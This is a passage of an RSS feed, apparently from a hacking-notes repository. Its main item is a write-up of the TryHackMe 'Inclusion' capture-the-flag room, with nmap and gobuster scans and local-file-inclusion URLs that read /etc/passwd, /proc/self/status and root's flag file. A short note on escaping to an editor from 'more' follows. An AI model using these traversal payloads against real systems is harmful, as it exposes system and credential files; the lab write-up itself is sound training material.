			<description>&lt;p&gt;This room is intended to focus on local file inclusion attacks, so my guess is that hitting the machine with nmap and gobuster is probably unnecessary. But, I'm going to do it anyway, just in case.&lt;/p&gt;&lt;p&gt;The target is 10.10.0.57. The website running there is basically a shell â most of the links, including the search box, don't work. No JavaScript is loaded. The only links that &lt;em&gt;do&lt;/em&gt; work are the &quot;View details&quot; buttons underneath the bottom three articles. This call an &lt;code&gt;/articles&lt;/code&gt; endpoint with a single parameter, &lt;code&gt;name&lt;/code&gt;. The resulting page looks like someone just dumped a plain text file between the &lt;code&gt;&amp;lt;body/&amp;gt;&lt;/code&gt; tags.&lt;/p&gt;&lt;p&gt;Given the purpose of the room, I'm going to guess they did.&lt;/p&gt;&lt;p&gt;While it's probably &lt;em&gt;pro forma&lt;/em&gt;, let's run our usual nmap scan just in case:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oA inclusion -Pn -A -T4 -sS -script vuln &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;ex&quot;&gt;-p-&lt;/span&gt; 10.10.0.57&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This gives the following output:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Tue Feb  1 18:58:37 2022 as: nmap -v -oA inclusion -Pn -A -T4 -sS -script vuln -p- 10.10.0.57
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.0.57
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|       MSF:ILITIES/UBUNTU-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2019-25017/    5.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/  5.8 https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/   *EXPLOIT*
|       MSF:ILITIES/IBM-AIX-CVE-2019-6111/  5.8 https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/    5.8 https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/ *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/  *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8 https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8 https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8 https://vulners.com/exploitdb/EDB-ID:46516  *EXPLOIT*
|       EDB-ID:46193    5.8 https://vulners.com/exploitdb/EDB-ID:46193  *EXPLOIT*
|       CVE-2019-6111   5.8 https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328    5.8 https://vulners.com/zdt/1337DAY-ID-32328    *EXPLOIT*
|       1337DAY-ID-32009    5.8 https://vulners.com/zdt/1337DAY-ID-32009    *EXPLOIT*
|       SSH_ENUM    5.0 https://vulners.com/canvas/SSH_ENUM *EXPLOIT*
|       PACKETSTORM:150621  5.0 https://vulners.com/packetstorm/PACKETSTORM:150621  *EXPLOIT*
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0 https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS  *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0 https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0 https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       EDB-ID:45939    5.0 https://vulners.com/exploitdb/EDB-ID:45939  *EXPLOIT*
|       EDB-ID:45233    5.0 https://vulners.com/exploitdb/EDB-ID:45233  *EXPLOIT*
|       CVE-2018-15919  5.0 https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0 https://vulners.com/cve/CVE-2018-15473
|       1337DAY-ID-31730    5.0 https://vulners.com/zdt/1337DAY-ID-31730    *EXPLOIT*
|       CVE-2021-41617  4.4 https://vulners.com/cve/CVE-2021-41617
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/  *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3 https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/    *EXPLOIT*
|       CVE-2020-14145  4.3 https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0 https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0 https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6 https://vulners.com/cve/CVE-2018-20685
|       PACKETSTORM:151227  0.0 https://vulners.com/packetstorm/PACKETSTORM:151227  *EXPLOIT*
|_      1337DAY-ID-30937    0.0 https://vulners.com/zdt/1337DAY-ID-30937    *EXPLOIT*
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server&amp;#39;s resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
| http-fileupload-exploiter: 
|   
|_    Couldn&amp;#39;t find a file-type field.
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:python:python:3.6.9: 
|       CVE-2021-3177   7.5 https://vulners.com/cve/CVE-2021-3177
|       CVE-2020-27619  7.5 https://vulners.com/cve/CVE-2020-27619
|       CVE-2020-8492   7.1 https://vulners.com/cve/CVE-2020-8492
|       CVE-2020-26116  6.4 https://vulners.com/cve/CVE-2020-26116
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-16056/  5.0 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-16056/   *EXPLOIT*
|       CVE-2019-9636   5.0 https://vulners.com/cve/CVE-2019-9636
|       CVE-2019-16056  5.0 https://vulners.com/cve/CVE-2019-16056
|       CVE-2018-20852  5.0 https://vulners.com/cve/CVE-2018-20852
|       CVE-2018-20406  5.0 https://vulners.com/cve/CVE-2018-20406
|       CVE-2018-1060   5.0 https://vulners.com/cve/CVE-2018-1060
|       MSF:ILITIES/SUSE-CVE-2020-14422/    4.3 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2020-14422/ *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-8315/   4.3 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-8315/    *EXPLOIT*
|       CVE-2021-28359  4.3 https://vulners.com/cve/CVE-2021-28359
|       CVE-2020-8315   4.3 https://vulners.com/cve/CVE-2020-8315
|       CVE-2020-14422  4.3 https://vulners.com/cve/CVE-2020-14422
|       CVE-2019-9947   4.3 https://vulners.com/cve/CVE-2019-9947
|       CVE-2019-9740   4.3 https://vulners.com/cve/CVE-2019-9740
|       CVE-2019-18348  4.3 https://vulners.com/cve/CVE-2019-18348
|       CVE-2019-16935  4.3 https://vulners.com/cve/CVE-2019-16935
|       CVE-2021-23336  4.0 https://vulners.com/cve/CVE-2021-23336
|       MSF:ILITIES/DEBIAN-CVE-2021-3426/   2.7 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2021-3426/    *EXPLOIT*
|_      CVE-2021-3426   2.7 https://vulners.com/cve/CVE-2021-3426
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/1%OT=22%CT=1%CU=40063%PV=Y%DS=4%DC=T%G=Y%TM=61F9EB2E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=102%TI=Z%CI=Z%TS=A)OPS(O1=M5
OS:06ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O
OS:6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%D
OS:F=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 48.616 days (since Wed Dec 15 04:37:20 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   38.25 ms  10.13.0.1
2   ... 3
4   170.72 ms 10.10.0.57

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb  1 19:23:42 2022 -- 1 IP address (1 host up) scanned in 1505.56 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, we've got a Linux box running SSH and some weird-ass httpd server on port 80.&lt;/p&gt;&lt;p&gt;We'll also hit 10.10.0.57 with gobuster:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gobuster&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-t&lt;/span&gt; 50 dir &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-u&lt;/span&gt; http://10.10.0.57 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This only detects the &lt;code&gt;/article&lt;/code&gt; endpoint I noted while poking around the site. (I could hit the site with a larger wordlist, but it doesn't seem worth it.)&lt;/p&gt;&lt;p&gt;I'm going to go out on a limb here and guess that we're going to exploit the &lt;code&gt;/article&lt;/code&gt; endpoint, which probably &lt;em&gt;is&lt;/em&gt; just pulling in files verbatim.&lt;/p&gt;&lt;p&gt;A common file on Linux systems is &lt;code&gt;/etc/os-release&lt;/code&gt;, so let's see if we can include this. And, in fact, after a little experimentation it turns out that we can using &lt;code&gt;http://10.10.0.57/article?name=../../../etc/os-release&lt;/code&gt;:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;NAME=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;Ubuntu&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;VERSION=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;18.04.3 LTS (Bionic Beaver)&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;ID=&lt;/span&gt;ubuntu&lt;/span&gt;
&lt;span id=&quot;cb4-4&quot;&gt;&lt;a href=&quot;#cb4-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;ID_LIKE=&lt;/span&gt;debian&lt;/span&gt;
&lt;span id=&quot;cb4-5&quot;&gt;&lt;a href=&quot;#cb4-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;PRETTY_NAME=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;Ubuntu 18.04.3 LTS&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb4-6&quot;&gt;&lt;a href=&quot;#cb4-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;VERSION_ID=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;18.04&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb4-7&quot;&gt;&lt;a href=&quot;#cb4-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;HOME_URL=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;https://www.ubuntu.com/&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb4-8&quot;&gt;&lt;a href=&quot;#cb4-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;SUPPORT_URL=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;https://help.ubuntu.com/&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb4-9&quot;&gt;&lt;a href=&quot;#cb4-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;BUG_REPORT_URL=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;https://bugs.launchpad.net/ubuntu/&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb4-10&quot;&gt;&lt;a href=&quot;#cb4-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;PRIVACY_POLICY_URL=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb4-11&quot;&gt;&lt;a href=&quot;#cb4-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;VERSION_CODENAME=&lt;/span&gt;bionic&lt;/span&gt;
&lt;span id=&quot;cb4-12&quot;&gt;&lt;a href=&quot;#cb4-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;UBUNTU_CODENAME=&lt;/span&gt;bionic&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;(It looks like &lt;code&gt;/article&lt;/code&gt; must be doing some simple escaping too.)&lt;/p&gt;&lt;p&gt;Let's grab &lt;code&gt;/etc/passwd&lt;/code&gt; so we know which users are running on the system.&lt;/p&gt;&lt;pre class=&quot;passwd&quot;&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I wonder who the current process is running as? &lt;code&gt;/proc/self/status&lt;/code&gt; should have the answer.&lt;/p&gt;&lt;pre class=&quot;proc&quot;&gt;&lt;code&gt;Name:   flask
Umask:  0022
State:  S (sleeping)
Tgid:   567
Ngid:   0
Pid:    567
PPid:   1
TracerPid:  0
Uid:    0   0   0   0
Gid:    0   0   0   0
FDSize: 128
Groups:  
NStgid: 567
NSpid:  567
NSpgid: 567
NSsid:  567
VmPeak:   751740 kB
VmSize:   669780 kB
VmLck:         0 kB
VmPin:         0 kB
VmHWM:     35560 kB
VmRSS:     35560 kB
RssAnon:       25656 kB
RssFile:        9904 kB
RssShmem:          0 kB
VmData:    74948 kB
VmStk:       132 kB
VmExe:      3792 kB
VmLib:      8568 kB
VmPTE:       292 kB
VmSwap:        0 kB
HugetlbPages:          0 kB
CoreDumping:    0
Threads:    4
SigQ:   0/3686
SigPnd: 0000000000000000
ShdPnd: 0000000000000000
SigBlk: 0000000000000000
SigIgn: 0000000001001000
SigCgt: 0000000180000002
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
NoNewPrivs: 0
Seccomp:    0
Speculation_Store_Bypass:   vulnerable
Cpus_allowed:   7fff
Cpus_allowed_list:  0-14
Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
Mems_allowed_list:  0
voluntary_ctxt_switches:    129378
nonvoluntary_ctxt_switches: 1378
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Score! We're running as &lt;code&gt;root&lt;/code&gt;. So we should be able to get our hands on anything.&lt;/p&gt;&lt;p&gt;Unfortunately, it looks like neither &lt;code&gt;falconfeast&lt;/code&gt; nor &lt;code&gt;root&lt;/code&gt; have SSH keys (I checked for &lt;code&gt;id_dsa&lt;/code&gt;, &lt;code&gt;id_rsa&lt;/code&gt;, and &lt;code&gt;id_id_ed25519&lt;/code&gt;), so we're just going to have to blindly find the flags.&lt;/p&gt;&lt;p&gt;Fortunately, the names are pretty standard:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;/home/falconfeast/user.txt&lt;/code&gt; can be obtained using &lt;code&gt;http://10.10.0.57/article?name=../../../home/falconfeast/user.txt&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;/root/root.txt&lt;/code&gt; can be obtained using &lt;code&gt;http://10.10.0.57/article?name=../../../root/root.txt&lt;/code&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;And with that, we're done.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/LFI%20%28Local%20File%20Inclusion%29%20Attacks.md&quot;&gt;LFI (Local File Inclusion) Attacks&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22gobuster%22.md&quot;&gt;Using &quot;gobuster&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ELAPSED TIME: 56 min&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/inclusion&quot;&gt;TryHackMe: Inclusion&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Inclusion.md</guid>
		</item>
		<item>
			<title>Jump to an Editor in "more"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Jump%20to%20an%20Editor%20in%20%22more%22.md</link>
			<description>&lt;p&gt;An editor can be invoked from &lt;code&gt;more&lt;/code&gt; using &lt;code&gt;v&lt;/code&gt;; by default this tries to invoke $VISUAL, and then $EDITOR, and then just vi before giving up.&lt;/p&gt;&lt;p&gt;Note that using &lt;code&gt;!&lt;/code&gt; to invoke a command (!/bin/bash, etc.) won't work, as by default &lt;code&gt;more&lt;/code&gt; is executing &lt;code&gt;$SHELL -c $COMMAND&lt;/code&gt;, which can fail if $SHELL is set to something exotic in /etc/passwd.&lt;/p&gt;&lt;p&gt;(Exotic shells in /etc/passwd can also cause commands executed via ssh to fail for the same reason.)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/a/52673010&quot;&gt;ssh works with my custom shell but can't execute commands directly using ssh&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Jump%20to%20an%20Editor%20in%20%22more%22.md</guid>
		</item>
		<item>
			<title>Jurassic Park</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Jurassic%20Park.md</link>
